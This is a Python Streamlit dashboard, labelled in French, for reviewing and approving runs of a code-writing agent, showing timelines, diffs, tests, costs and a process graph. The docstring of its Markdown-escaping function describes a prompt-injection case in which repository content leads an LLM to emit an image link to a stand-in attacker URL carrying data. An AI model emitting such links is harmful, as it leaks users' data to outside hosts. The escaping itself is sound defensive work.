"""Streamlit dashboard: follow and decide on the runs of the agent, in plain French.

    streamlit run src/dashboard.py

Runs are listed by date, project and task (never by id), filtered by project and status. A run shows what
happened as a timeline (plan, decisions, code, tests, outcome), the plan and the diff, the test output and
the process graph drawn from `graph.TRANSITIONS`. A run waiting for a decision gets the same three answers
as the interactive agent: Oui / Non / Affiner (and « Écrire quand même » once the automatic fixes ran out).
Every refresh sweeps expired approvals first. Data access, labels, the timeline and the graph are plain
functions (tested without Streamlit); `main()` only lays them out.
"""

import asyncio
import getpass
import re
from dataclasses import dataclass
from datetime import UTC, datetime
from pathlib import Path

import streamlit as st

from src.config import DEFAULT_DB, Settings
from src.labels import (
    ACTION_LABELS,
    EDGE_LABELS,
    GATE_LABELS,
    REASON_EXPLANATIONS,
    STATUS_LABELS,
    STEP_LABELS,
    TERMINAL_REASONS,
    status_label,
)
from src.llm.client import LLMProviderError
from src.llm.fake import FakeScriptExhaustedError
from src.models.state import (
    TERMINAL_STATUSES,
    AgentProcessState,
    ApprovalDecision,
    ProcessStatus,
    StepMetrics,
)
from src.process.engine import DecisionRefusedError, DecisionRequest
from src.process.graph import TRANSITIONS, Limits, Step, Terminal
from src.process.steps import HumanApprovalStep
from src.runtime import open_runner
from src.storage.sqlite_store import EventRecord
from src.tools.git_ops import GitError
from src.tools.sandbox import SandboxUnavailableError

IDLE, VISITED, CURRENT = "#f4f4f5", "#dbeafe", "#fde68a"
SUCCESS, FAILURE = "#bbf7d0", "#fecaca"
ALL = "Tous"
OVERVIEW = ""  # the "Vue d'ensemble" entry of the run picker
BAR_COLOR = "#2a78d6"  # one hue: these charts compare magnitudes, they do not tell series apart
_NEVER = datetime(1970, 1, 1, tzinfo=UTC)  # sorts runs or entries without a timestamp first


@dataclass(frozen=True)
class RunRow:
    state: AgentProcessState
    started: datetime | None
    cost_usd: float = 0.0
    compute_ms: float = 0.0
    wait_ms: float = 0.0


@dataclass(frozen=True)
class Overview:
    runs: int
    written: int  # files written with passing tests
    written_failing: int  # "write anyway"
    stopped: int  # refused, expired or failed: nothing written
    awaiting: int
    cost_eur: float
    budget_used_pct: float
    compute_ms: float
    wait_ms: float
    by_status: dict[str, int]
    cost_by_project: dict[str, float]

    @property
    def success_rate(self) -> float:
        finished = self.written + self.written_failing + self.stopped
        return self.written / finished if finished else 0.0


@dataclass(frozen=True)
class RunView:
    state: AgentProcessState
    events: list[EventRecord]
    approvals: list[ApprovalDecision]
    metrics: list[StepMetrics]
    cost_usd: float


@dataclass(frozen=True)
class TimelineItem:
    at: datetime | None
    category: str  # Tâche, Plan, Code, Tests, Décision...
    title: str
    detail: str | None = None  # untrusted text, shown as code
    detail_kind: str = "text"  # "plan", "diff", "tests", "text"


# --- data (no Streamlit) ---------------------------------------------------------------------------------


async def load_runs(db: Path) -> list[RunRow]:
    """Every run, newest first."""
    async with open_runner(db, drive=False) as runner:
        await runner.sweep_expired()
        runs = await runner.store.list_runs()
        starts = await runner.store.run_starts()
        totals = await runner.store.run_totals()
    rows = [
        RunRow(state, starts.get(state.run_id), *totals.get(state.run_id, (0.0, 0.0, 0.0))) for state in runs
    ]
    return sorted(rows, key=lambda r: r.started or _NEVER, reverse=True)


async def load_run(db: Path, run_id: str) -> RunView:
    async with open_runner(db, drive=False) as runner:
        state = await runner.status(run_id)  # sweeps expired approvals first
        store = runner.store
        return RunView(
            state=state,
            events=await store.list_events(run_id),
            approvals=await store.list_approvals(run_id),
            metrics=await store.list_metrics(run_id),
            cost_usd=await store.llm_cost_usd(run_id),
        )


async def submit_decision(
    db: Path, run_id: str, request: DecisionRequest, *, mock: bool, script: Path | None
) -> AgentProcessState:
    async with open_runner(db, drive=True, mock=mock, script=script) as runner:
        return await runner.decide(run_id, request)


def project_name(state: AgentProcessState) -> str:
    return Path(state.target_repo_path).name or state.target_repo_path


def _local(at: datetime) -> datetime:
    return at.astimezone()


def short(text: str, limit: int = 60) -> str:
    one_line = " ".join(text.split())
    return one_line if len(one_line) <= limit else one_line[: limit - 1].rstrip() + "…"


def run_label(row: RunRow) -> str:
    """« cuisine_rag · Ajoute un endpoint /recipes »: date and status are in the details and filters."""
    return f"{project_name(row.state)} · {short(row.state.user_prompt, 40)}"


def overview(rows: list[RunRow], settings: Settings) -> Overview:
    """The whole history in a few numbers: what was written, what was stopped, what it cost."""
    finished_ok = [r for r in rows if r.state.status is ProcessStatus.COMPLETED and not r.state.undone]
    by_status: dict[str, int] = {}
    cost_by_project: dict[str, float] = {}
    for r in rows:
        by_status[status_label(r.state)] = by_status.get(status_label(r.state), 0) + 1
        project = project_name(r.state)
        cost_by_project[project] = cost_by_project.get(project, 0.0) + settings.usd_to_eur(r.cost_usd)
    cost_eur = settings.usd_to_eur(sum(r.cost_usd for r in rows))
    return Overview(
        runs=len(rows),
        written=sum(r.state.terminal_reason is None for r in finished_ok),
        written_failing=sum(r.state.terminal_reason is not None for r in finished_ok),
        stopped=sum(
            r.state.status in (ProcessStatus.REJECTED, ProcessStatus.EXPIRED, ProcessStatus.FAILED)
            for r in rows
        ),
        awaiting=sum(r.state.status is ProcessStatus.AWAITING_APPROVAL for r in rows),
        cost_eur=cost_eur,
        budget_used_pct=100 * cost_eur / settings.BUDGET_EUR_TOTAL,
        compute_ms=sum(r.compute_ms for r in rows),
        wait_ms=sum(r.wait_ms for r in rows),
        by_status=dict(sorted(by_status.items(), key=lambda kv: -kv[1])),
        cost_by_project=dict(sorted(cost_by_project.items(), key=lambda kv: -kv[1])),
    )


def filter_runs(rows: list[RunRow], project: str, status: str) -> list[RunRow]:
    return [
        r for r in rows if project in (ALL, project_name(r.state)) and status in (ALL, status_label(r.state))
    ]


def timeline(view: RunView) -> list[TimelineItem]:
    """What happened, in order, in words: built from the journal, the decisions and the final state."""
    state = view.state
    items: list[TimelineItem] = []
    last = {e.step: e.id for e in view.events if e.event_type == "step_completed"}  # later ids win
    last_plan, last_code, last_tests = last.get(Step.PLAN), last.get(Step.CODE), last.get(Step.VERIFY)
    for e in view.events:
        if e.event_type == "run_started":
            items.append(TimelineItem(e.ts, "Tâche", "Tâche reçue", state.user_prompt))
        elif e.event_type == "step_completed" and e.step == Step.PLAN:
            plan = "\n".join(f"{i}. {s}" for i, s in enumerate(state.execution_plan or [], 1))
            title = f"Plan proposé ({state.target_file or '?'})" if e.id == last_plan else "Plan proposé"
            items.append(TimelineItem(e.ts, "Plan", title, plan if e.id == last_plan else None, "plan"))
        elif e.event_type == "step_completed" and e.step == Step.CODE:
            diff = state.unified_diff if e.id == last_code else None
            items.append(TimelineItem(e.ts, "Code", "Code proposé", diff, "diff"))
        elif e.event_type == "step_completed" and e.step == Step.VERIFY:
            passed = (e.payload or {}).get("event") == "VerificationPassed"
            detail = None
            if e.id == last_tests and state.verification is not None:
                v = state.verification
                detail = v.error_summary or f"{v.pytest_output}\n{v.linter_output}".strip()
            title = "Tests réussis" if passed else "Tests en échec"
            items.append(TimelineItem(e.ts, "Tests", title, detail, "tests"))
        elif e.event_type == "suspended":
            gate = str((e.payload or {}).get("gate", ""))
            items.append(
                TimelineItem(e.ts, "Attente", f"En attente de ta décision sur {GATE_LABELS.get(gate, gate)}")
            )
        elif e.event_type == "step_completed" and e.step == Step.FINALIZE:
            if (e.payload or {}).get("event") == "Written":
                items.append(TimelineItem(e.ts, "Écriture", f"Fichier écrit : {state.target_file}"))
            else:
                items.append(TimelineItem(e.ts, "Écriture", "Écriture refusée", state.error_message))
        elif e.event_type == "step_failed":
            reason = str((e.payload or {}).get("reason", ""))
            items.append(TimelineItem(e.ts, "Échec", f"Échec : {TERMINAL_REASONS.get(reason, reason)}"))
        elif e.event_type == "run_finished":
            reason = state.terminal_reason or ""
            items.append(TimelineItem(e.ts, "Fin", status_label(state), REASON_EXPLANATIONS.get(reason)))
        elif e.event_type == "undone":
            items.append(TimelineItem(e.ts, "Annulation", "Écriture annulée (fichier restauré)"))
    for d in view.approvals:
        title = f"{d.actor} {ACTION_LABELS[d.action]} {GATE_LABELS[d.gate]}"
        items.append(TimelineItem(d.decided_at, "Décision", title, d.comment))
    return sorted(items, key=lambda i: i.at or _NEVER)


_MARKDOWN_SPECIAL = re.compile(r"([\\`*_{}\[\]()#+\-.!|<>~$])")


def md_escape(text: str) -> str:
    """Neutralise Markdown in untrusted text (LLM output, tool output, prompts, paths).

    Streamlit renders Markdown in markdown/caption/info/error...; an LLM steered by content of the target
    repository could otherwise emit `![](https://attacker/?data=...)` and make the browser fetch it.
    """
    return _MARKDOWN_SPECIAL.sub(r"\\\1", text)


def _quote(text: str) -> str:
    return '"' + text.replace("\\", "\\\\").replace('"', '\\"') + '"'


def build_dot(state: AgentProcessState, visited: set[str]) -> str:
    """Graphviz DOT of the transition table; the run's position is highlighted."""
    terminal = state.status in TERMINAL_STATUSES
    lines = [
        "digraph process {",
        "  rankdir=LR;",
        '  node [shape=box, style="rounded,filled", fontname="Helvetica", fontsize=11];',
        '  edge [fontname="Helvetica", fontsize=9];',
    ]
    for step in Step:
        if not terminal and state.current_step == step.value:
            fill, pen = CURRENT, 2.5
        else:
            fill, pen = (VISITED if step.value in visited else IDLE), 1.0
        label = _quote(STEP_LABELS[step])
        lines.append(f"  {_quote(step.value)} [label={label}, fillcolor={_quote(fill)}, penwidth={pen}];")
    for status in sorted({t.target.status for t in TRANSITIONS if isinstance(t.target, Terminal)}):
        fill = IDLE
        if state.status is status:
            ok = status is ProcessStatus.COMPLETED and state.terminal_reason is None
            fill = SUCCESS if ok else FAILURE
        label = _quote(STATUS_LABELS[status])
        lines.append(f"  {_quote(status.value)} [label={label}, fillcolor={_quote(fill)}, shape=oval];")
    for t in TRANSITIONS:
        target = t.target.status.value if isinstance(t.target, Terminal) else t.target.value
        style = ", style=dashed" if t.loop else ""
        label = _quote(EDGE_LABELS.get(t.label, t.label))
        lines.append(f"  {_quote(t.source.value)} -> {_quote(target)} [label={label}{style}];")
    lines.append("}")
    return "\n".join(lines)


def _table(rows: list[dict[str, object]]) -> None:
    st.dataframe(rows, width="stretch", hide_index=True)  # pyright: ignore[reportUnknownMemberType]


def _seconds(ms: float) -> str:
    """12.3 s, 5 min 46 s, 1 h 02 min: readable at a glance."""
    seconds = ms / 1000
    if seconds < 60:
        return f"{seconds:.1f} s"
    minutes, sec = divmod(round(seconds), 60)
    if minutes < 60:
        return f"{minutes} min {sec:02d} s"
    hours, minutes = divmod(minutes, 60)
    return f"{hours} h {minutes:02d} min"


# --- page --------------------------------------------------------------------------------------------------

_DECISION_ERRORS = (
    DecisionRefusedError,
    LLMProviderError,
    SandboxUnavailableError,
    FakeScriptExhaustedError,
    GitError,
    LookupError,
    ValueError,
)


def _sidebar_settings() -> tuple[Path, bool, Path | None]:
    with st.sidebar.expander("Avancé"):
        db = Path(st.text_input("Base de données", value=str(DEFAULT_DB), key="db_path"))
        mock = st.checkbox("LLM simulé (tests)", key="mock_llm")
        script_text = st.text_input(
            "Script du LLM simulé (JSON)", value="", key="mock_script", disabled=not mock
        )
    return db, mock, (Path(script_text) if script_text else None)


def _pick_run(rows: list[RunRow]) -> str:
    projects = sorted({project_name(r.state) for r in rows})
    project = st.sidebar.selectbox("Projet", [ALL, *projects], key="project")
    statuses = sorted({status_label(r.state) for r in rows})
    status = st.sidebar.selectbox("Statut", [ALL, *statuses], key="status_filter")
    shown = filter_runs(rows, project, status)
    if not shown:
        st.sidebar.info("Aucun run ne correspond à ces filtres.")
        return OVERVIEW
    labels = {OVERVIEW: "Vue d'ensemble", **{r.state.run_id: run_label(r) for r in shown}}
    selected = st.sidebar.selectbox(
        "Afficher", list(labels), format_func=lambda run_id: labels[run_id], key="run_id"
    )
    st.sidebar.button(
        "Rafraîchir", key="refresh", help="Recharge les runs et expire les validations dépassées"
    )
    return selected


def _decision_panel(view: RunView, db: Path, mock: bool, script: Path | None, limits: Limits) -> None:
    state = view.state
    gate = HumanApprovalStep.gate(state)
    if gate is None:
        return
    anyway = HumanApprovalStep.write_anyway_allowed(state, limits)
    with st.container(border=True):
        if gate == "plan":
            st.subheader("À toi : valider ce plan ?")
            st.caption("Oui : l'agent génère le code (rien n'est écrit). Affiner : il refait le plan.")
        elif anyway:
            st.subheader("À toi : les tests échouent encore")
            st.warning(
                f"Après {limits.max_fix} corrections automatiques, les tests échouent toujours. "
                "Tu peux affiner (nouvel essai guidé), abandonner, ou écrire le fichier quand même."
            )
        else:
            st.subheader("À toi : écrire ce fichier ?")
            st.caption("Oui : le fichier est écrit dans une copie, testé, puis copié dans ton dossier si OK.")
        if gate == "plan":
            st.markdown(f"**Fichier choisi :** `{md_escape(state.target_file or '?')}`")
            for i, step in enumerate(state.execution_plan or [], 1):
                st.markdown(f"{i}\\. {md_escape(step)}")
        else:
            if state.verification is not None and state.verification.error_summary:
                st.markdown(f"**Dernière erreur :** {md_escape(state.verification.error_summary)}")
            st.code(state.unified_diff or "(aucun changement)", language="diff")
        if state.approval_deadline is not None:
            deadline = _local(state.approval_deadline).strftime("%d/%m %H:%M")
            st.caption(f"Sans réponse avant le {deadline}, le run expire.")
        actor = st.text_input("Ton nom (enregistré avec la décision)", value=_login(), key="actor")
        comment = st.text_area("Ce qu'il faut changer (pour Affiner)", key="comment")
        yes_col, refine_col, no_col = st.columns(3)
        clicked = None
        if anyway:
            if yes_col.button("Écrire quand même", key="write_anyway", type="primary"):
                clicked = "write_anyway"
        elif yes_col.button("Oui", key="approve", type="primary"):
            clicked = "approve"
        if refine_col.button("Affiner", key="revise"):
            clicked = "revise"
        if no_col.button("Non", key="reject"):
            clicked = "reject"
    if clicked is None:
        return
    if clicked == "revise" and not comment.strip():
        st.error("Pour affiner, écris ce qu'il faut changer (commentaire obligatoire).")
        return
    try:
        request = DecisionRequest.model_validate(
            {"action": clicked, "actor": actor, "comment": comment or None}
        )
        with st.spinner("L'agent travaille sur la suite…"):
            new_state = asyncio.run(submit_decision(db, state.run_id, request, mock=mock, script=script))
    except _DECISION_ERRORS as exc:
        st.error(f"Décision refusée : {md_escape(str(exc))}")
        return
    st.session_state["flash"] = f"Décision enregistrée. Statut du run : {status_label(new_state)}."
    st.rerun()


def _login() -> str:
    try:
        return getpass.getuser()
    except (OSError, KeyError):
        return ""


def _status_banner(state: AgentProcessState) -> None:
    label = status_label(state)
    explanation = REASON_EXPLANATIONS.get(state.terminal_reason or "", "")
    message = f"**{label}**" + (f" — {explanation}" if explanation else "")
    if state.undone:
        st.info(message)
    elif state.status is ProcessStatus.COMPLETED and state.terminal_reason is None:
        st.success(message)
    elif state.status is ProcessStatus.COMPLETED or state.status is ProcessStatus.AWAITING_APPROVAL:
        st.warning(message)
    elif state.status in TERMINAL_STATUSES:
        st.error(message)
    else:  # a step was running when the agent stopped (crash, Ctrl+C, provider error)
        st.info(f"{message} — si l'agent n'est plus ouvert, reprends ce run avec `/resume {state.run_id}`.")
    if state.error_message and state.terminal_reason != "human_rejected":
        with st.expander("Détail technique de l'erreur"):
            st.code(state.error_message)
    if state.compensation is not None and not state.compensation.done:
        st.warning(
            "Le nettoyage de la copie de travail du run a échoué : "
            f"{md_escape(state.compensation.detail or '')}. Supprime-la à la main (`git worktree prune`)."
        )


def _timeline(view: RunView) -> None:
    for item in timeline(view):
        when = _local(item.at).strftime("%H:%M:%S") if item.at else ""
        st.markdown(f":gray[{when} · {item.category}]  \n**{md_escape(item.title)}**")
        if item.detail:
            with st.expander("Voir le détail"):
                st.code(item.detail, language="diff" if item.detail_kind == "diff" else None)


def _run_details(view: RunView, db: Path, mock: bool, script: Path | None) -> None:
    state, settings = view.state, Settings()
    st.markdown(f"## {md_escape(short(state.user_prompt, 120))}")
    file = state.target_file or "fichier pas encore choisi"
    st.caption(md_escape(f"Projet {project_name(state)} · {file} · {state.target_repo_path}"))
    _status_banner(state)
    _decision_panel(view, db, mock, script, settings.limits())

    compute = sum(m.compute_ms for m in view.metrics)
    wait = sum(m.wait_ms for m in view.metrics)
    cost_col, compute_col, wait_col, iter_col = st.columns(4)
    cost_col.metric("Coût", f"{settings.usd_to_eur(view.cost_usd):.4f} €")
    compute_col.metric("Temps machine", _seconds(compute))
    wait_col.metric("Attente humaine", _seconds(wait))
    iter_col.metric("Corrections / affinages", f"{state.fix_iteration} / {state.revision_iteration}")

    story_tab, change_tab, tests_tab, graph_tab, raw_tab = st.tabs(
        ["Déroulé", "Plan et modification", "Tests", "Graphe", "Données brutes"]
    )
    with story_tab:
        _timeline(view)
    with change_tab:
        st.markdown(f"**Fichier :** `{md_escape(state.target_file or '?')}`")
        for i, step in enumerate(state.execution_plan or [], 1):
            st.markdown(f"{i}\\. {md_escape(step)}")
        st.code(state.unified_diff or "(pas encore de modification)", language="diff")
    with tests_tab:
        v = state.verification
        if v is None:
            st.write("Pas encore testé.")
        else:
            verdict = {True: "réussi", False: "en échec"}
            st.write(
                f"{v.tests_label} : {verdict[v.pytest_passed]} — {v.lint_label} : {verdict[v.linter_passed]}"
            )
            if v.error_summary:
                st.markdown(f"**Résumé donné au modèle :** {md_escape(v.error_summary)}")
            with st.expander(f"Sortie de {v.tests_label}"):
                st.code(v.pytest_output or "(vide)")
            with st.expander(f"Sortie de {v.lint_label}"):
                st.code(v.linter_output or "(vide)")
    with graph_tab:
        visited = {e.step for e in view.events if e.event_type == "step_completed"}
        st.graphviz_chart(build_dot(state, visited))  # pyright: ignore[reportUnknownMemberType]  (stub gap)
    with raw_tab:
        st.caption(f"Identifiant du run : {state.run_id}")
        st.markdown("**Journal**")
        _table(
            [
                {
                    "heure": _local(e.ts).strftime("%H:%M:%S"),
                    "étape": e.step,
                    "itération": e.iteration,
                    "événement": e.event_type,
                    "données": str(e.payload) if e.payload else "",
                }
                for e in view.events
            ]
        )
        st.markdown("**Décisions**")
        _table([a.model_dump(mode="json") for a in view.approvals] or [{"décision": "aucune"}])
        st.markdown("**Mesures par étape**")
        _table(
            [
                {
                    "étape": m.step_name,
                    "itération": m.iteration,
                    "modèle": m.model_id or "",
                    "statut": m.status,
                    "calcul (ms)": round(m.compute_ms),
                    "attente (ms)": round(m.wait_ms),
                    "tokens entrée": m.prompt_tokens,
                    "tokens sortie": m.completion_tokens,
                    "coût (USD)": m.cost_usd,
                }
                for m in view.metrics
            ]
        )


def _when(row: RunRow) -> str:
    return _local(row.started).strftime("%d/%m %H:%M") if row.started else ""


def _overview_page(rows: list[RunRow], settings: Settings) -> None:
    o = overview(rows, settings)
    st.markdown("## Vue d'ensemble")
    st.caption(f"{o.runs} runs enregistrés, tous projets confondus. Choisis un run à gauche pour le détail.")
    cost_col, runs_col, written_col, waiting_col = st.columns(4)
    cost_col.metric(
        "Coût total",
        f"{o.cost_eur:.4f} €",
        help=f"{o.budget_used_pct:.2f} % du budget de {settings.BUDGET_EUR_TOTAL:.0f} €",
    )
    runs_col.metric("Runs", o.runs)
    written_col.metric(
        "Fichiers écrits",
        o.written + o.written_failing,
        help=f"Dont écrits malgré des tests en échec : {o.written_failing}",
    )
    waiting_col.metric("En attente de décision", o.awaiting)
    rate_col, stopped_col, compute_col, wait_col = st.columns(4)
    rate_col.metric(
        "Taux de réussite", f"{100 * o.success_rate:.0f} %", help="Runs terminés avec des tests OK"
    )
    stopped_col.metric("Arrêtés sans écriture", o.stopped, help="Refusés, expirés ou échoués")
    compute_col.metric("Temps machine", _seconds(o.compute_ms))
    wait_col.metric("Attente humaine", _seconds(o.wait_ms))

    status_col, cost_chart_col = st.columns(2)
    with status_col:
        st.markdown("**Runs par statut**")
        st.bar_chart(  # pyright: ignore[reportUnknownMemberType]
            {"statut": list(o.by_status), "runs": list(o.by_status.values())},
            x="statut",
            y="runs",
            horizontal=True,
            color=BAR_COLOR,
        )
    with cost_chart_col:
        st.markdown("**Coût par projet (€)**")
        st.bar_chart(  # pyright: ignore[reportUnknownMemberType]
            {"projet": list(o.cost_by_project), "coût (€)": list(o.cost_by_project.values())},
            x="projet",
            y="coût (€)",
            horizontal=True,
            color=BAR_COLOR,
        )

    st.markdown("### Ce qui a été fait")
    done = [r for r in rows if r.state.status is ProcessStatus.COMPLETED]
    if not done:
        st.caption("Aucun fichier écrit pour l'instant.")
    else:
        _table(
            [
                {
                    "date": _when(r),
                    "projet": project_name(r.state),
                    "fichier": r.state.target_file or "",
                    "tâche": short(r.state.user_prompt, 90),
                    "résultat": status_label(r.state),
                    "coût (€)": round(settings.usd_to_eur(r.cost_usd), 5),
                }
                for r in done
            ]
        )
    _all_runs(rows, settings)


def _all_runs(rows: list[RunRow], settings: Settings) -> None:
    st.markdown("### Tous les runs")
    _table(
        [
            {
                "date": _when(r),
                "projet": project_name(r.state),
                "tâche": short(r.state.user_prompt, 80),
                "fichier": r.state.target_file or "",
                "statut": status_label(r.state),
                "coût (€)": round(settings.usd_to_eur(r.cost_usd), 5),
                "temps machine": _seconds(r.compute_ms),
            }
            for r in rows
        ]
    )


def main() -> None:
    st.set_page_config(page_title="Omar Sy Valide", layout="wide")
    st.sidebar.title("Omar Sy Valide")
    db, mock, script = _sidebar_settings()
    if flash := st.session_state.pop("flash", None):
        st.success(flash)
    if not db.exists():
        st.info("Aucun run pour l'instant. Lance l'agent avec `python omar.py` dans un projet.")
        return
    rows = asyncio.run(load_runs(db))
    if not rows:
        st.info("Aucun run pour l'instant.")
        return
    selected = _pick_run(rows)
    if selected == OVERVIEW:
        _overview_page(rows, Settings())
    else:
        _run_details(asyncio.run(load_run(db, selected)), db, mock, script)


if __name__ == "__main__":
    main()
